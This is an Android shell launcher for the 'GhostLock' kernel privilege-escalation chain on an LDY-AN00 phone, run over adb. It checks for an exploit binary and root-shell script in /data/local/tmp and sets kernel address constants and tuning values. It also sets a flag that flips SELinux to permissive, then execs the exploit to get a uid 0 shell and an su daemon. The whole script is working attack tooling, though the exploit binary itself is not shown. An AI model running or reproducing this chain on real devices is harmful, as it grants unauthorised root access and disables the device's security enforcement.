#!/system/bin/sh
# On-device launcher for the LDY-AN00 GhostLock root session.
# Invoked by root.sh as: adb shell -t /data/local/tmp/ldy_rootshell.sh
#
# The chain takes 1-6 minutes.  When it finishes, the escalated child execs
# /data/local/tmp/rootsh.sh, which starts the root su daemon and gives this
# adb session an interactive root shell:
#
#   HNLDY-M:/ #      uid=0(root), SELinux permissive, context u:r:kernel:s0
#
# After that, any other adb shell (uid 2000) can run /data/local/tmp/su.
# Root is per-boot and RAM-only; rerun root.sh after a reboot.
set -u

BIN=/data/local/tmp/device_root
ROOTSH=/data/local/tmp/rootsh.sh
if [ ! -x "$BIN" ]; then
    echo "error: $BIN is missing; run ./root.sh from the host" >&2
    exit 1
fi
if [ ! -x "$ROOTSH" ]; then
    echo "error: $ROOTSH is missing; run ./root.sh from the host" >&2
    exit 1
fi

# Device constants: kernel physical load == memstart_addr -> delta 0.
export KPHYS=0x80000000
export PHYSOFF=0x80000000
# Freeze-shaper / chain tuning verified on the phone.
export BIG_MB=512
export HOLDER_MIN_US=25000
export CHILD_WAIT_MS=120000
export ATTEMPTS=20
# Flip selinux_state to permissive before the selinuxfs API write and the
# root-shell exec.
export PERMISSIVE=1
# The escalated child execs this; it starts the su daemon, then sh -i.
export ROOTSHELL_PATH="$ROOTSH"

echo "[*] GhostLock: starting the chain (1-6 minutes). Root prompt: HNLDY-M:/ #"
echo "[*] After root, any adb shell can run /data/local/tmp/su"
exec "$BIN" rootshell
